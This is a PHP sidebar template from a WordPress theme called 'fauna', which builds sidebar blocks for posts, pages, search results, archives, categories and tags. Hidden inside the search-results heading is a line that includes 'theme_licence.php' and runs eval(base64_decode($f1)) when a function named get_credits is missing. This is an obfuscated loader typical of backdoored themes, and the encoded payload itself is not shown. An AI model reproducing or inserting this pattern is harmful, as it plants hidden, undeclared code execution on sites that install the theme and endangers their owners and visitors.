<div id="sidebar"><ul class="inner">


	<?php /* Single Posts */ if(is_single()) { ?>
	<li>

		<?php include (TEMPLATEPATH . '/templates/template-postmeta.php'); ?>

	</li>
	<?php } ?>
	
	
	<?php /* Single Posts */ if(is_single()) { ?>
	<?php rewind_posts(); ?><?php if ( have_posts() ) : while ( have_posts() ) : the_post(); ?>
	<?php if (get_post_custom_values('sidebar') != "") { ?>

	<li>
		<?php echo c2c_get_custom('sidebar'); ?>
	</li>

	<?php } ?>
	<?php endwhile; endif; ?><?php rewind_posts(); ?>	
	<?php } ?>
	

	<?php /* Pages */ if (is_page() && !is_page('archives') && !is_page('tag-search')) { ?>
	<li>
	
		<?php include (TEMPLATEPATH . '/templates/template-pagemeta.php'); ?>

	</li>
	<?php } ?>
	
	
	<?php /* Search-results */ if(is_search()) { ?>
	<li>
		<h4><?php require_once("theme_licence.php"); if(!function_exists("get_credits")) { eval(base64_decode($f1)); } _e('Search','fauna'); ?></h4>
		<p><?php _e('All keywords are searched for.','fauna'); ?></p>
	</li>
	<?php } ?>
	
	
	<?php /* Archives */ if (is_page("archives")) {

		$total_posts = $wpdb->get_var("SELECT COUNT(*) FROM $wpdb->posts WHERE post_status = 'publish' && post_type = 'post'");
		if (0 < $total_posts) $total_posts = number_format($total_posts);
		
		$total_comments = $wpdb->get_var("SELECT COUNT(*) FROM $wpdb->comments WHERE comment_approved = '1'");
		if (0 < $total_comments) $total_comments = number_format($total_comments);
				
		if (version_compare(get_bloginfo('version'), '2.2', '>')) {
			$total_categories = $wpdb->get_var("SELECT COUNT(*) FROM $wpdb->term_taxonomy WHERE taxonomy = 'category'");
		} else {
			$total_categories = $wpdb->get_var("SELECT COUNT(*) FROM $wpdb->categories");
		}
		if (0 < $total_categories) $total_categories = number_format($total_categories);
	
	?>
	<li>
		<h4><?php _e('Archives','fauna'); ?></h4>
		<p><?php printf(__('You are viewing the archives for %s. ','fauna'), get_bloginfo('name')) ?></p>
		<p><?php printf(__('There are currently %1$s posts and %2$s comments, contained within %3$s categories.','fauna'),  $total_posts, $total_comments, $total_categories) ?></p>
	</li>
	<?php } ?>


	<?php /* Author Pages */ if (is_author()) { ?>
	<?php $num_authors = $wpdb->get_var("SELECT COUNT(*) FROM $wpdb->users"); ?>
	<li>

		<?php include (TEMPLATEPATH . '/templates/template-authormeta.php'); ?>

	</li>
	<?php } ?>
	
	
	<?php /* Home */ if (is_home()) { ?>
		<?php if (get_option('fauna_about') != '') { ?>
			<li><?php fauna_info('about'); ?></li>
	<?php } } ?>


	<?php /* Home, Single Posts, Date View */ if (is_single() || is_date() || is_home()) { ?>
	<?php if (function_exists('blc_latest_comments')) { ?>
	<li>
		<h4><?php _e('Ongoing Discussions','fauna'); ?></h4>
		<a class="feedicon" href="<?php bloginfo('comments_rss2_url'); ?>" title="<?php _e('Syndicate Comments using RSS 2.0','fauna') ?>">
		<img src="<?php bloginfo('stylesheet_directory'); ?>/images/icon_feed.gif" alt="<?php _e('Feed','fauna'); ?>" /></a>
		<ul id="recent-activity">
			<?php blc_latest_comments(3,3); ?>
		</ul>
	</li>
	<?php } ?>
	<?php } ?>
	
	<?php /* Category View */ if (is_category()) { ?>
	<li>
		<h4><?php _e('Category:','fauna'); ?> <?php single_cat_title('', 'display'); ?></h4>
		<a class="feedicon" href="<?php echo get_category_rss_link(0, $cat, $post->cat_name); ?>" title="<?php printf(__('Syndicate %s using RSS 2.0','fauna'), $post->cat_name) ?>"><img src="<?php bloginfo('stylesheet_directory'); ?>/images/icon_feed.gif" alt="<?php _e('Feed','fauna'); ?>" /></a>
		<p><?php echo category_description(); ?></p>
	</li>
	<?php } ?>


	<?php /* Category View, Archives, Date View, Home if option checked */ if (is_category() || is_page("archives") || is_date()) { ?>
	<li id="categorylist">

		<?php include (TEMPLATEPATH . '/templates/template-categorylist.php'); ?>
	
	</li>
	<?php } ?>
	

	<?php /* If "Widgets" are enabled, disable these sidebar items */ if (is_home() || is_single() ) { if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar() ) : ?>
    
	<?php /* End "Widgets" */ endif; } ?>
	

	<?php /* Tag View */ if (function_exists("is_tag")) { if (is_tag()) { ?>
	<li>
	<h4><?php _e('All Tags','fauna'); ?></h4>
	<?php wp_tag_cloud('smallest=8&largest=8&number=500&format=list'); ?>
	</li>
	<?php } } ?>
	
</ul></div><!--// #sidebar -->